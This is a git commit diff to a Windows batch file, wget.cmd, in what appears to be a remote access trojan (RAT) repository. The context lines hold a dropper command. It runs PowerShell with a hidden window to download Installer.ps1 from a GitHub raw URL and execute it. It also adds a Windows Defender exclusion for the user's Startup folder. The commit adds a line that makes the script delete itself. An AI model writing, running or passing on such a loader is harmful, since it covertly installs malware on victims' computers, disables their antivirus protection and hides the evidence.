1088a46f1c644bdb5c68583734f0d6cc5c789d10
lukeeeeeee335 <lukeeeeeee334@gmail.com>
2026-01-25 17:26:05 +0000

    Created rat-shell

--- files/wget.cmd
+++ files/wget.cmd
@@ -32,3 +32,5 @@ if '%errorlevel%' NEQ '0' (
 REM Rat resources
 powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/Installer.ps1 -OutFile Installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; ./Installer.ps1
 
+@REM self delete
+del wget.cmd
